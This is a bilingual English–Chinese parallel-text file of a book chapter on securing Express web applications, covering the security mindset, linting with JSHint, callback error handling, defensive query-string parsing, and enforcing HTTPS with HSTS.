- en: 10  Security
  id: totrans-0
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 10  安全
- en: 'In Chapter 8, I told you that I had three favorite chapters.  The first was
    Chapter 3, where I discussed the foundations of Express in an attempt to give
    you a solid understanding of the framework. The second favorite was Chapter 8,
    where your applications used databases to become “more real”. Welcome to my final
    favorite: the chapter about security.'
  id: totrans-1
  prefs: []
  type: TYPE_NORMAL
  zh: 在第8章，我告诉你我有三个最喜欢的章节。第一个是第3章，我在那里讨论了Express的基础，试图让你对框架有一个扎实的理解。第二个最喜欢的章节是第8章，你的应用程序使用数据库变得“更真实”。欢迎来到我最喜欢的最后一个章节：关于安全的章节。
- en: I probably don’t have to tell you that computer security is important, and becoming
    more so by the day. You’ve surely seen news headlines about data breaches, cyber-warfare,
    and “hacktivism”. As our world moves more and more into the digital sphere, our
    digital security becomes more and more important.
  id: totrans-2
  prefs: []
  type: TYPE_NORMAL
  zh: 我可能不需要告诉你，计算机安全很重要，而且每天都在变得更加重要。你肯定看到过关于数据泄露、网络战和“黑客活动”的新闻头条。随着我们的世界越来越多地进入数字领域，我们的数字安全变得越来越重要。
- en: 'Keeping your Express applications secure should (hopefully) be important—who wants to
    be hacked? In this chapter, we’ll discuss the various ways your applications could
    be subverted and how to defend yourself. More specifically, we’ll talk about:'
  id: totrans-3
  prefs: []
  type: TYPE_NORMAL
  zh: 保持你的Express应用程序安全应该是（希望）重要的——谁愿意被黑客攻击？在本章中，我们将讨论你的应用程序可能被颠覆的各种方式以及如何保护自己。更具体地说，我们将讨论：
- en: ·  How the “security mindset” can help you spot security holes
  id: totrans-4
  prefs: []
  type: TYPE_NORMAL
  zh: ·  “安全思维”如何帮助你发现安全漏洞
- en: ·  Keeping your code bug-free (insofar as possible!)
  id: totrans-5
  prefs: []
  type: TYPE_NORMAL
  zh: ·  保持你的代码无错误（尽可能！）
- en: ·  Protecting your users against cross-site scripting, cross-site request forgery,
    and man-in-the-middle attacks
  id: totrans-6
  prefs: []
  type: TYPE_NORMAL
  zh: ·  保护你的用户免受跨站脚本、跨站请求伪造和中间人攻击
- en: ·  Handling the inevitable server crash
  id: totrans-7
  prefs: []
  type: TYPE_NORMAL
  zh: ·  处理不可避免的服务器崩溃
- en: ·  Auditing your third-party code
  id: totrans-8
  prefs: []
  type: TYPE_NORMAL
  zh: ·  审计你的第三方代码
- en: ·  Various minor security tactics; fixing browser bugs, preventing “clickjacking”,
    etc.
  id: totrans-9
  prefs: []
  type: TYPE_NORMAL
  zh: ·  各种小型的安全策略；修复浏览器漏洞，防止“点击劫持”等。
- en: This chapter doesn’t have as much of a singular flow as the others. We’ll find
    ourselves exploring a topic and then jumping to another, and while there may be
    some similarities, most of these attacks are relatively disparate.
  id: totrans-10
  prefs: []
  type: TYPE_NORMAL
  zh: 本章与其他章节相比，并没有那么流畅。我们会发现自己探索一个主题，然后跳到另一个，尽管可能存在一些相似之处，但大多数这些攻击相对来说是不同的。
- en: 10.1  The security mindset
  id: totrans-11
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 10.1  安全思维
- en: 'Famous security technologist Bruce Schneier describes something that he calls
    the “security mindset”:'
  id: totrans-12
  prefs: []
  type: TYPE_NORMAL
  zh: 著名的安全技术专家布鲁斯·施奈尔（Bruce Schneier）描述了他称之为“安全思维”的东西：
- en: Uncle Milton Industries has been selling ant farms to children since 1956\.
    Some years ago, I remember opening one up with a friend. There were no actual
    ants included in the box. Instead, there was a card that you filled in with your
    address, and the company would mail you some ants. My friend expressed surprise
    that you could get ants sent to you in the mail.
  id: totrans-13
  prefs: []
  type: TYPE_NORMAL
  zh: 米尔顿叔叔工业公司（Uncle Milton Industries）自1956年以来一直在向儿童销售蚂蚁农场。几年前，我记得和朋友打开了一个。盒子里没有实际包含蚂蚁。相反，有一张卡片，你填写你的地址，公司就会给你邮寄一些蚂蚁。我的朋友对可以通过邮寄收到蚂蚁表示惊讶。
- en: 'I replied: "What''s really interesting is that these people will send a tube
    of live ants to anyone you tell them to."'
  id: totrans-14
  prefs: []
  type: TYPE_NORMAL
  zh: 我回答说：“真正有趣的是，这些人会向任何人你告诉他们的人寄送一管活蚂蚁。”
- en: Security requires a particular mindset. Security professionals -- at least the
    good ones -- see the world differently. They can't walk into a store without noticing
    how they might shoplift. They can't use a computer without wondering about the
    security vulnerabilities. They can't vote without trying to figure out how to
    vote twice. They just can't help it.
  id: totrans-15
  prefs: []
  type: TYPE_NORMAL
  zh: 安全需要一种特定的思维方式。安全专业人士——至少是那些优秀的——看待世界的方式不同。他们走进商店时，不能不注意到他们可能会偷窃。他们使用电脑时，不能不思考安全漏洞。他们投票时，不能不试图想出如何重复投票。他们就是无法控制自己。
- en: — “The Security Mindset” by Bruce Schneier, at [https://www.schneier.com/blog/archives/2008/03/the_security_mi_1.html](https://www.schneier.com/blog/archives/2008/03/the_security_mi_1.html)
  id: totrans-16
  prefs: []
  type: TYPE_NORMAL
  zh: — “安全思维”布鲁斯·施奈尔（Bruce Schneier），在[https://www.schneier.com/blog/archives/2008/03/the_security_mi_1.html](https://www.schneier.com/blog/archives/2008/03/the_security_mi_1.html)
- en: Bruce Schneier isn’t advocating that you should steal things and break the law!
    But the best way to secure yourself is to think like an attacker—how could someone
    subvert a system? How could someone abuse what they’re given? If you can think
    like an attacker and seek out loopholes in your own code, then you can figure
    out how to close those holes and make your application more secure.
  id: totrans-17
  prefs: []
  type: TYPE_NORMAL
  zh: Bruce Schneier并不是在提倡你应该偷东西和违法！但保护自己的最佳方式是像攻击者一样思考——有人会如何破坏系统？有人会如何滥用他们所拥有的？如果你能像攻击者一样思考，并在自己的代码中寻找漏洞，那么你可以找出如何关闭这些漏洞，并使你的应用程序更加安全。
- en: This chapter can’t possibly cover every security vulnerability out there. Between
    the time I write this and the time you read this, there will likely be a new attack
    vector that could affect your Express applications. Thinking like an attacker
    will help you defend your applications against the endless onslaught of possible
    security flaws.
  id: totrans-18
  prefs: []
  type: TYPE_NORMAL
  zh: 这章不可能涵盖所有存在的安全漏洞。在我写这章和你看这章之间，可能会出现一个新的攻击向量，可能会影响你的Express应用程序。像攻击者一样思考将帮助你防御应用程序免受可能的安全漏洞的无尽攻击。
- en: Just because I'm not going through every security vulnerability doesn't mean
    I won't go through the common ones. Read on!
  id: totrans-19
  prefs: []
  type: TYPE_NORMAL
  zh: 就算我没有逐一介绍每个安全漏洞，并不意味着我不会介绍常见的那些。请继续阅读！
- en: 10.2  Keeping your code as bug-free as possible
  id: totrans-20
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 10.2  尽可能使你的代码无错误
- en: At this point in your programming career, you've likely realized that most bugs
    are bad and that you should take measures to prevent them. It should come as no
    surprise that many bugs can cause security vulnerabilities. For example, if a
    certain kind of user input can crash your application, a hacker could simply flood
    your servers with those requests and bring the service down for everyone. We don't
    want that!
  id: totrans-21
  prefs: []
  type: TYPE_NORMAL
  zh: 在你的编程生涯的这个阶段，你很可能已经意识到大多数错误都是不好的，你应该采取措施来防止它们。许多错误可能导致安全漏洞这一点并不令人惊讶。例如，如果某种用户输入可以导致你的应用程序崩溃，黑客只需用这些请求洪水般地攻击你的服务器，就会使服务对所有人关闭。我们不想看到这种情况发生！
- en: 'There are a variety of methods you can use to keep your Express applications
    bug-free, and therefore less susceptible to attacks. In this section, I won''t
    cover the general principles for keeping your software bug-free, but here are
    a few to keep in mind:'
  id: totrans-22
  prefs: []
  type: TYPE_NORMAL
  zh: 你可以使用各种方法来保持你的Express应用程序无错误，因此减少受到攻击的可能性。在本节中，我不会涵盖保持软件无错误的通用原则，但这里有一些需要记住的：
- en: ·  Testing is terribly important. We discussed testing in the previous chapter.
  id: totrans-23
  prefs: []
  type: TYPE_NORMAL
  zh: ·  测试非常重要。我们在上一章讨论了测试。
- en: ·  Code reviews can be quite helpful. More eyes on the code almost certainly
    means fewer bugs.
  id: totrans-24
  prefs: []
  type: TYPE_NORMAL
  zh: ·  代码审查非常有帮助。更多的眼睛关注代码几乎肯定意味着更少的错误。
- en: ·  Don't reinvent the wheel. If someone has made a library that does what you
    want, you should probably use the library. Make sure the library is well-tested
    and reliable!
  id: totrans-25
  prefs: []
  type: TYPE_NORMAL
  zh: ·  不要重新发明轮子。如果有人已经创建了一个库，它能够完成你想要的功能，那么你很可能应该使用这个库。确保这个库经过充分测试并且可靠！
- en: ·  Stick to good coding practices. We'll go over some Express and JavaScript-specific
    issues, but you should make sure your code is well-architected and clean.
  id: totrans-26
  prefs: []
  type: TYPE_NORMAL
  zh: ·  坚持良好的编码实践。我们将讨论一些Express和JavaScript特定的问题，但你应该确保你的代码结构良好且干净。
- en: We'll talk about Express-specifics in this section, but the things above are
    hugely helpful in preventing bugs, and therefore in preventing security issues.
  id: totrans-27
  prefs: []
  type: TYPE_NORMAL
  zh: 我们将在本节中讨论Express特定的内容，但上述内容在防止错误，因此也在防止安全问题方面非常有帮助。
- en: 10.2.1   Enforcing good JavaScript with JSHint
  id: totrans-28
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 10.2.1   使用JSHint强制执行良好的JavaScript
- en: 'At some point in your JavaScript life, you''ve probably heard of JavaScript:
    The Good Parts. If you haven''t, it''s a famous book by Douglas Crockford, the
    inventor of JSON (or the "discoverer", as he calls it). It carves out a subset
    of the language that''s deemed "good", and the rest is discouraged.'
  id: totrans-29
  prefs: []
  type: TYPE_NORMAL
  zh: '在你的JavaScript生涯中，你可能在某个时刻听说过《JavaScript: The Good Parts》。如果你还没有听说过，这是一本由JSON（或他称之为“发现者”）的发明者Douglas
    Crockford所著的著名书籍。它划定了语言的一个子集，被认为是“好的”，而其余的部分则被劝阻不要使用。'
- en: For example, Crockford discourages the use of the double-equals operator (`==`)
    and instead recommends sticking to the triple-equals operator (`===`). The double-equals
    operator does type coercion, which can get complicated and can introduce bugs,
    while the triple-equals operator works pretty much how you'd expect.
  id: totrans-30
  prefs: []
  type: TYPE_NORMAL
  zh: 例如，Crockford不鼓励使用双等号运算符（`==`），而是建议坚持使用三等号运算符（`===`）。双等号运算符进行类型强制转换，可能会变得复杂，并可能引入错误，而三等号运算符几乎按你期望的方式工作。
- en: 'In addition, there are a number of common pitfalls that befall JavaScript developers
    that aren''t necessarily the language''s fault. To name a few: missing semicolons,
    forgetting the `var` statement, and misspelling variable names.'
  id: totrans-31
  prefs: []
  type: TYPE_NORMAL
  zh: 此外，还有许多常见的陷阱困扰着 JavaScript 开发者，这并不一定是语言本身的错误。举几个例子：缺少分号、忘记 `var` 语句和拼写变量名错误。
- en: 'If there were a tool that enforced good coding style and a tool that helped
    you fix errors, would you use them? What if they were just one tool? I''ll stop
    you before your imagination runs too wild: there''s a tool called JSHint.'
  id: totrans-32
  prefs: []
  type: TYPE_NORMAL
  zh: 如果有一个工具可以强制良好的编码风格，并且有一个工具可以帮助你修复错误，你会使用它们吗？如果它们是同一个工具呢？在我让你想象力过于奔放之前，我要告诉你：有一个叫做
    JSHint 的工具。
- en: JSHint looks at your code and points out what it calls "suspicious usage". It's
    not technically incorrect to use the double-equals operator or to forget `var`,
    but it's likely to be an error.
  id: totrans-33
  prefs: []
  type: TYPE_NORMAL
  zh: JSHint 会检查你的代码，并指出它所说的“可疑使用”。使用双等号运算符或忘记 `var` 并不是技术上错误的，但很可能是错误。
- en: 'To install JSHint, you''ll install it globally with `npm install jshint -g`.
    Now, if you type `jshint myfile.js`, JSHint will look at your code and alert you
    to any suspicious usage or bugs. For example, take a look at this file:'
  id: totrans-34
  prefs: []
  type: TYPE_NORMAL
  zh: 要安装 JSHint，你可以使用 `npm install jshint -g` 全局安装它。现在，如果你输入 `jshint myfile.js`，JSHint
    将会检查你的代码，并提醒你任何可疑的使用或 bug。例如，看看这个文件：
- en: Listing 10.1 A JavaScript file with a bug
  id: totrans-35
  prefs: []
  type: TYPE_NORMAL
  zh: 列表 10.1 一个带有错误的 JavaScript 文件
- en: '`function square(n) {` `  var result n * n;  #A` `  return result;` `}``square(5);`'
  id: totrans-36
  prefs: []
  type: TYPE_NORMAL
  zh: '`function square(n) {` `  var result n * n;  #A` `  return result;` `}``square(5);`'
- en: '#A Note the missing = sign here.'
  id: totrans-37
  prefs: []
  type: TYPE_NORMAL
  zh: '#A 注意这里缺少的等号。'
- en: 'Notice that the second line has an error: we are missing an equals sign. If
    we run JSHint on this file (with `jshint myfile.js`), we''ll see the following
    output:'
  id: totrans-38
  prefs: []
  type: TYPE_NORMAL
  zh: 注意，第二行有一个错误：我们遗漏了一个等号。如果我们在这个文件上运行 JSHint（使用 `jshint myfile.js`），我们会看到以下输出：
- en: '`myfile.js: line 2, col 13, Missing semicolon.` `myfile.js: line 3, col 18,
    Expected an assignment or function call and instead saw an expression.`  `2 errors`'
  id: totrans-39
  prefs: []
  type: TYPE_NORMAL
  zh: '`myfile.js: line 2, col 13, Missing semicolon.` `myfile.js: line 3, col 18,
    Expected an assignment or function call and instead saw an expression.`  `2 errors`'
- en: If we see this, we know that something's wrong! We can go back and add the equals
    sign, and then JSHint will stop complaining.
  id: totrans-40
  prefs: []
  type: TYPE_NORMAL
  zh: 如果我们看到这个，我们就知道有问题！我们可以回去添加等号，然后 JSHint 就会停止抱怨。
- en: In my opinion, JSHint works best when integrated with your editor of choice.
    Visit the JSHint download page at [http://jshint.com/install/](http://jshint.com/install/) for
    a list of editor integrations. Now, you'll see the errors before you even run
    the code!
  id: totrans-41
  prefs: []
  type: TYPE_NORMAL
  zh: 在我看来，JSHint 与你选择的编辑器集成时效果最好。访问 JSHint 下载页面 [http://jshint.com/install/](http://jshint.com/install/)
    以获取编辑器集成的列表。现在，你甚至可以在运行代码之前看到错误！
- en: '![](../Images/10_01.png)'
  id: totrans-42
  prefs: []
  type: TYPE_IMG
  zh: '![](../Images/10_01.png)'
- en: Figure 10.1 JSHint integration in the Sublime Text editor. Notice the error
    on the left side of the window and the message at the bottom in the status bar.
  id: totrans-43
  prefs: []
  type: TYPE_NORMAL
  zh: 图 10.1 在 Sublime Text 编辑器中集成 JSHint。注意窗口左侧的错误和状态栏底部的消息。
- en: JSHint has saved me a ton of time when working with JavaScript and has fixed
    countless bugs. I know some of those bugs have been security holes.
  id: totrans-44
  prefs: []
  type: TYPE_NORMAL
  zh: JSHint 在我使用 JavaScript 的时候节省了我大量的时间，并修复了无数个 bug。我知道其中一些 bug 是安全漏洞。
- en: 10.2.2   Halting after errors happen in callbacks
  id: totrans-45
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 10.2.2 回调中发生错误后的停止
- en: Callbacks are a pretty important part of Node. Every middleware and route in
    Express uses them, not to mention…well, nearly everything else! Unfortunately,
    people make a few mistakes with callbacks, and these can create bugs.
  id: totrans-46
  prefs: []
  type: TYPE_NORMAL
  zh: 回调是 Node.js 中非常重要的一个部分。Express 中的每个中间件和路由都使用它们，更不用说……好吧，几乎所有的其他东西！不幸的是，人们在回调中犯了一些错误，这些错误可能会产生
    bug。
- en: 'See if you can spot the error in this code:'
  id: totrans-47
  prefs: []
  type: TYPE_NORMAL
  zh: 看看你是否能在这段代码中找到错误：
- en: '`fs.readFile("myfile.txt", function(err, data) {` `  if (err)  {` `       
    console.error(err);` `  }` `  console.log(data);``});`'
  id: totrans-48
  prefs: []
  type: TYPE_NORMAL
  zh: '`fs.readFile("myfile.txt", function(err, data) {` `  if (err)  {` `       
    console.error(err);` `  }` `  console.log(data);``});`'
- en: In this code, we're reading a file and outputting its contents with `console.log` if
    everything worked. But if it didn't work for some reason, we output the error…and
    then just continue on to try to output the file's data!
  id: totrans-49
  prefs: []
  type: TYPE_NORMAL
  zh: 在这段代码中，我们正在读取一个文件，并在一切正常的情况下使用 `console.log` 输出其内容。但如果由于某种原因没有正常工作，我们会输出错误信息，然后继续尝试输出文件的数据！
- en: 'If there''s an error, we should be halting execution. For example:'
  id: totrans-50
  prefs: []
  type: TYPE_NORMAL
  zh: 如果出现错误，我们应该停止执行。例如：
- en: '`fs.readFile("myfile.txt", function(err, data) {` `  if (err)  {` `    console.error(err);`
    `    throw err;  #A` `  }` `  console.log(data);``});`'
  id: totrans-51
  prefs: []
  type: TYPE_NORMAL
  zh: '`fs.readFile("myfile.txt", function(err, data) {` `  if (err)  {` `    console.error(err);`
    `    throw err;  #A` `  }` `  console.log(data);``});`'
- en: '#A If there''s an error, we''ll never continue to the rest of the code, because
    there''s been an error!'
  id: totrans-52
  prefs: []
  type: TYPE_NORMAL
  zh: '#A 如果有错误，我们永远不会继续执行代码的其余部分，因为已经出现了错误！'
- en: It's usually important to stop if there's any kind of error. You don't want
    to be dealing with errant results—this can cause your server to have buggy behavior.
  id: totrans-53
  prefs: []
  type: TYPE_NORMAL
  zh: 通常，如果出现任何错误，停止操作是很重要的。你不想处理错误的结果——这可能导致你的服务器出现错误行为。
- en: 10.2.3   Perilous parsing of query strings
  id: totrans-54
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 10.2.3 查询字符串的危险解析
- en: 'It''s very common for websites to have query strings. For example, almost every
    search engine you''ve ever used features a query string of some sort. A search
    for "crockford backflip video" might look something like this:'
  id: totrans-55
  prefs: []
  type: TYPE_NORMAL
  zh: 网站通常都有查询字符串。例如，你使用过的几乎每个搜索引擎都包含某种类型的查询字符串。搜索 "crockford backflip video" 可能看起来像这样：
- en: '`http://mysearchengine.com/search?q=crockford+backflip+video`'
  id: totrans-56
  prefs: []
  type: TYPE_NORMAL
  zh: '`http://mysearchengine.com/search?q=crockford+backflip+video`'
- en: 'In Express, you can grab the query by using `req.query`, like so:'
  id: totrans-57
  prefs: []
  type: TYPE_NORMAL
  zh: 在 Express 中，你可以通过使用 `req.query` 来获取查询参数，如下所示：
- en: 'Listing 10.2 Grabbing req.query (note: contains bugs!)'
  id: totrans-58
  prefs: []
  type: TYPE_NORMAL
  zh: 列表 10.2 获取 req.query（注意：包含错误！）
- en: '`app.get("/search", function(req, res) {` `  var search = req.query.q.replace(/\+/g,
    " ");  #A` `  // ...do something with the search...``});`'
  id: totrans-59
  prefs: []
  type: TYPE_NORMAL
  zh: '`app.get("/search", function(req, res) {` `  var search = req.query.q.replace(/\+/g,
    " ");  #A` `  // ...do something with the search...``});`'
- en: '#A This variable will now contain the string "crockford backflip video".'
  id: totrans-60
  prefs: []
  type: TYPE_NORMAL
  zh: '#A 这个变量现在将包含字符串 "crockford backflip video"。'
- en: This is all well and good, unless the input isn't exactly as you expect. For
    example, if a user visits the `/search` route with no query named `q`, then we'll
    be calling `.replace` on an undefined variable! This can crash our server.
  id: totrans-61
  prefs: []
  type: TYPE_NORMAL
  zh: 这听起来很好，但如果输入不是你期望的，那就另当别论了。例如，如果用户访问没有名为 `q` 的查询的 `/search` 路由，那么我们将对未定义的变量调用
    `.replace`！这可能导致我们的服务器崩溃。
- en: 'You''ll always want to make sure that your users are giving you the data you
    expect, and if they aren''t, you''ll need to do something about it. One simple
    option is to just provide a default case, so if they don''t give anything, assume
    the query is empty. For example:'
  id: totrans-62
  prefs: []
  type: TYPE_NORMAL
  zh: 你总是想确保你的用户给你提供你期望的数据，如果他们没有，你需要对此采取一些措施。一个简单的选项是提供一个默认情况，如果他们没有提供任何内容，假设查询为空。例如：
- en: 'Listing 10.3 Don''t assume your queries exist (note: still contains bugs!)'
  id: totrans-63
  prefs: []
  type: TYPE_NORMAL
  zh: 列表 10.3 不要假设你的查询存在（注意：仍然包含错误！）
- en: '`app.get("/search", function(req, res) {` `  var search = req.query.q || "";  
    #A` `  var terms = search.split("+");` `  // ...do something with the terms...``});`'
  id: totrans-64
  prefs: []
  type: TYPE_NORMAL
  zh: '`app.get("/search", function(req, res) {` `  var search = req.query.q || "";  
    #A` `  var terms = search.split("+");` `  // ...do something with the terms...``});`'
- en: '#A Now, if req.query.q is undefined, we''ll fall back to non-errant behavior.
    Alternatively, you could redirect if nothing has been typed, or give some other
    behavior.'
  id: totrans-65
  prefs: []
  type: TYPE_NORMAL
  zh: '#A 现在，如果 req.query.q 是未定义的，我们将回退到非错误行为。或者，如果什么都没有输入，你可以重定向，或者给出其他行为。'
- en: 'This fixes one important bug: if we''re expecting a query string isn''t there,
    we don''t have undefined variables.'
  id: totrans-66
  prefs: []
  type: TYPE_NORMAL
  zh: 这修复了一个重要的错误：如果我们期望的查询字符串不存在，我们不会遇到未定义的变量。
- en: But there's another important gotcha with Express's parsing of query strings.
    In addition to the variables potentially being undefined, variables can also be
    of the wrong type (but still be defined)!
  id: totrans-67
  prefs: []
  type: TYPE_NORMAL
  zh: 但 Express 解析查询字符串时还有一个重要的陷阱。除了变量可能未定义之外，变量还可以是错误类型（但仍然已定义）！
- en: 'If a user visits `/search?q=abc`, then `req.query.q` will be a string. It''ll
    still be a string if they visit `/search?q=abc&name=douglas`. But if they specify
    the `q` variable twice, like this:'
  id: totrans-68
  prefs: []
  type: TYPE_NORMAL
  zh: 如果用户访问 `/search?q=abc`，那么 `req.query.q` 将是一个字符串。如果他们访问 `/search?q=abc&name=douglas`，它仍然是一个字符串。但如果他们指定
    `q` 变量两次，如下所示：
- en: '`` /search?q=abc`&q=xyz` ``'
  id: totrans-69
  prefs: []
  type: TYPE_NORMAL
  zh: '`` /search?q=abc`&q=xyz` ``'
- en: …then `req.query.q` will be the array `["abc", "xyz"]`. Now, if you try to call `.replace` on
    it, it'll fail again because that method isn't defined on arrays. Oh no!
  id: totrans-70
  prefs: []
  type: TYPE_NORMAL
  zh: …然后 `req.query.q` 将是数组 `["abc", "xyz"]`。现在，如果你尝试调用 `.replace`，它将再次失败，因为该方法在数组上未定义。哦，不！
- en: Personally, I think that this is a design flaw of Express. This behavior should
    be allowed, but I don't think that it should be enabled by default. Until they
    change it (and I'm not sure they have plans to), you'll need to assume that your
    queries could be arrays.
  id: totrans-71
  prefs: []
  type: TYPE_NORMAL
  zh: 我个人认为，这是 Express 的设计缺陷。这种行为应该被允许，但我认为它不应该默认启用。在他们改变它（而且我不确定他们是否有计划）之前，你需要假设你的查询可能是数组。
- en: To solve this problem (and others), I wrote the `arraywrap` package (at [https://www.npmjs.org/package/arraywrap](https://www.npmjs.org/package/arraywrap)).
    It's a very small module; the whole thing is only 11 lines of code. It's a function
    that takes one argument. If the argument isn't already an array, it wraps it in
    an array. If the argument is an array, it just returns the argument and does nothing.
  id: totrans-72
  prefs: []
  type: TYPE_NORMAL
  zh: 为了解决这个问题（以及其他问题），我编写了`arraywrap`包（在[https://www.npmjs.org/package/arraywrap](https://www.npmjs.org/package/arraywrap)）。这是一个非常小的模块；整个包只有11行代码。它是一个接受一个参数的函数。如果参数不是数组，它将其包裹在数组中。如果参数是数组，它就返回参数并什么都不做。
- en: 'You can install it with `npm install arraywrap --save` and then you can use
    it to coerce all of your query strings to arrays, like so:'
  id: totrans-73
  prefs: []
  type: TYPE_NORMAL
  zh: 您可以使用`npm install arraywrap --save`来安装它，然后您可以使用它将所有的查询字符串强制转换为数组，如下所示：
- en: Listing 10.4 Don't assume your queries aren't arrays
  id: totrans-74
  prefs: []
  type: TYPE_NORMAL
  zh: 列表10.4 不要假设您的查询不是数组
- en: '`var arrayWrap = require("arraywrap");`   `// …`   `app.get("/search", function(req,
    res) {` `  var search = arrayWrap(req.query.q || "");   #A` `  var terms = search[0].split("+");`
    `  // ...do something with the terms...``});`'
  id: totrans-75
  prefs: []
  type: TYPE_NORMAL
  zh: '`var arrayWrap = require("arraywrap");` `// …` `app.get("/search", function(req,
    res) {` `  var search = arrayWrap(req.query.q || "");   #A` `  var terms = search[0].split("+");`
    `  // ...do something with the terms...``});`'
- en: '#A Now things work if we supply a single variable, supply no variables, or
    supply multiple variables.'
  id: totrans-76
  prefs: []
  type: TYPE_NORMAL
  zh: '#A 现在如果我们提供一个变量，不提供变量，或者提供多个变量，事情都会正常工作。'
- en: Now, if someone gives you more queries than you expect, you just take the first
    one and ignore the rest. Alternatively, you could detect if the query was an array
    and do something different there.
  id: totrans-77
  prefs: []
  type: TYPE_NORMAL
  zh: 现在，如果有人给您比您预期的更多查询，您只需取第一个并忽略其余的。或者，您可以检测查询是否为数组，并在那里做不同的事情。
- en: This brings us to a big point of the chapter: never trust user input. Assume
    that every route will be broken in some way. Assume your users could give you
    bad data or no data at all!
  id: totrans-78
  prefs: []
  type: TYPE_NORMAL
  zh: 这引出了本章的一个大要点：永远不要信任用户输入。假设每个路由都会以某种方式出错。假设您的用户可能会给您提供错误数据或根本不提供数据！
- en: 10.3  Protecting your users
  id: totrans-79
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 10.3 保护您的用户
- en: Governments have had their sites defaced; Twitter had a kind of "tweet virus";
    bank account information has been stolen. Even products who aren't dealing with
    particularly sensitive data can still have passwords leaked—Sony and Adobe have
    been caught up in such scandals. If you site has users, you'll want to be responsible
    and protect them.
  id: totrans-80
  prefs: []
  type: TYPE_NORMAL
  zh: 政府的网站已被破坏；Twitter出现了一种“推文病毒”；银行账户信息被盗。即使不处理特别敏感数据的公司也可能发生密码泄露——索尼和Adobe就陷入了这样的丑闻。如果您网站有用户，您会希望负责任地保护他们。
- en: There are a number of things you can do to protect your users from harm, and
    we'll look at those in this section.
  id: totrans-81
  prefs: []
  type: TYPE_NORMAL
  zh: 您可以采取许多措施来保护您的用户免受伤害，我们将在本节中探讨这些措施。
- en: 10.3.1   Using HTTPS
  id: totrans-82
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 10.3.1 使用HTTPS
- en: In short, you want to use HTTPS instead of HTTP. It helps protect your users
    against all kinds of attacks. Trust me—you want it!
  id: totrans-83
  prefs: []
  type: TYPE_NORMAL
  zh: 简而言之，您想要使用HTTPS而不是HTTP。这有助于保护您的用户免受各种攻击。请相信我——您想要它！
- en: There are two pieces of Express middleware that you'll want to use with HTTPS.
    One will force your users to use HTTPS and the other will keep them there.
  id: totrans-84
  prefs: []
  type: TYPE_NORMAL
  zh: 有两个Express中间件您会想要与HTTPS一起使用。一个会强制您的用户使用HTTPS，另一个会让他们留在那里。
- en: FORCE USERS TO HTTPS
  id: totrans-85
  prefs: []
  type: TYPE_NORMAL
  zh: 强制用户使用HTTPS
- en: The first middleware we'll look at is `express-enforces-ssl`. As the name suggests,
    it enforces SSL (HTTPS). Basically, if the request is over HTTPS, it continues
    onto the rest of your middleware and routes. If not, it redirects to the HTTPS
    version.
  id: totrans-86
  prefs: []
  type: TYPE_NORMAL
  zh: 我们首先查看的是`express-enforces-ssl`中间件。正如其名所示，它强制执行SSL（HTTPS）。基本上，如果请求是通过HTTPS进行的，它将继续到您的其余中间件和路由。如果不是，它将重定向到HTTPS版本。
- en: To use this module, you'll need to do two things.
  id: totrans-87
  prefs: []
  type: TYPE_NORMAL
  zh: 要使用此模块，您需要做两件事。
- en: 1.  Most of the time, when you deploy your applications, your server isn't directly
    connecting to the client. If you're deployed to the Heroku cloud platform (as
    we'll see in Chapter 11), Heroku servers sit "between" you and the client. To
    tell Express about this, we'll need to enable the "trust proxy" setting.
  id: totrans-88
  prefs: []
  type: TYPE_NORMAL
  zh: 1. 大多数时候，当您部署应用程序时，您的服务器并不是直接连接到客户端。如果您部署到Heroku云平台（我们将在第11章中看到），Heroku服务器位于您和客户端之间。为了告诉Express这一点，我们需要启用“信任代理”设置。
- en: 2.  Call the middleware!
  id: totrans-89
  prefs: []
  type: TYPE_NORMAL
  zh: 2. 调用中间件！
- en: '3.  Make sure you `npm install express-enforces-ssl`, and then:'
  id: totrans-90
  prefs: []
  type: TYPE_NORMAL
  zh: 3. 确保您`npm install express-enforces-ssl`，然后：
- en: Listing 10.5 Enforcing HTTPS in Express
  id: totrans-91
  prefs: []
  type: TYPE_NORMAL
  zh: 列表10.5 在Express中强制执行HTTPS
- en: '`var enforceSSL = require("express-enforces-ssl");` `// ...` `app.enable("trust
    proxy");``app.use(enforceSSL());`'
  id: totrans-92
  prefs: []
  type: TYPE_NORMAL
  zh: '`var enforceSSL = require("express-enforces-ssl");` `// ...` `app.enable("trust
    proxy");``app.use(enforceSSL());`'
- en: There's not much more to this module, but you can see more at [https://github.com/aredo/express-enforces-ssl](https://github.com/aredo/express-enforces-ssl).
  id: totrans-93
  prefs: []
  type: TYPE_NORMAL
  zh: 这个模块没有太多其他内容，但你可以在 [https://github.com/aredo/express-enforces-ssl](https://github.com/aredo/express-enforces-ssl)
    上看到更多。
- en: KEEP USERS ON HTTPS
  id: totrans-94
  prefs: []
  type: TYPE_NORMAL
  zh: 保持用户在 HTTPS 上
- en: Once your users are on HTTPS, we'll want to tell them to avoid going back to
    HTTP. New browsers support a feature called HTTP Strict Transport Security (shortened
    to HSTS). It's a simple HTTP header that tells browsers to stay on HTTPS for a
    period of time.
  id: totrans-95
  prefs: []
  type: TYPE_NORMAL
  zh: 一旦您的用户使用 HTTPS，我们希望告诉他们避免回到 HTTP。新浏览器支持一个名为 HTTP 严格传输安全（简称 HSTS）的功能。这是一个简单的
    HTTP 头部，告诉浏览器在一定时间内保持 HTTPS。
- en: 'For example, if you want to keep your users on HTTPS for one year, you''d set
    the following header:'
  id: totrans-96
  prefs: []
  type: TYPE_NORMAL
  zh: 例如，如果你想让你的用户在 HTTPS 上保持一年，你可以设置以下头部：
- en: Listing 10.6 Sticking to HTTPS for one year
  id: totrans-97
  prefs: []
  type: TYPE_NORMAL
  zh: 列表 10.6 保持 HTTPS 一年
- en: '`Strict-Transport-Security: max-age=31536000  #A`'
  id: totrans-98
  prefs: []
  type: TYPE_NORMAL
  zh: '`Strict-Transport-Security: max-age=31536000  #A`'
- en: '#A There are approximately 3,1536,000 seconds in a year.'
  id: totrans-99
  prefs: []
  type: TYPE_NORMAL
  zh: '#A 一年大约有 3,1536,000 秒。'
- en: You can also enable support for subdomains. If you own slime.biz, you'll probably
    want to enable HSTS for cool.slime.biz.
